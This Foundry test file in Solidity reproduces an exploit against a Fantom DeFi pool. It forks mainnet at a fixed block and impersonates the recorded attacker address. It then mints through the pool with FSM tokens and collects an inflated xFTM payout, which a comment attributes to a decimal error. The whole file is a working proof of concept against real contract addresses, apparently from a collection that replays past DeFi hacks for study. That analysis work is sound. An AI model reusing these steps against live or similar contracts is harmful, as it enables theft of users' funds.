// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
    IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
    Pool pool = Pool(payable(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937));
    address attacker = 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("fantom", 32_971_742); //fork fantom block number 32971742
    }

    function testExploit() public {
        cheat.prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400);
        fsm.transfer(address(this), 100_000_000_000_000_000_000);
        emit log_named_uint("Before exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
        fsm.approve(address(pool), type(uint256).max);
        pool.mint(100_000_000_000_000_000_000, 1); // Due to the decimal error, the _xftmOut is bigger than it is supposed to be.
        cheat.roll(32_971_743);
        pool.collect();
        emit log_named_uint("After exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
    }
}
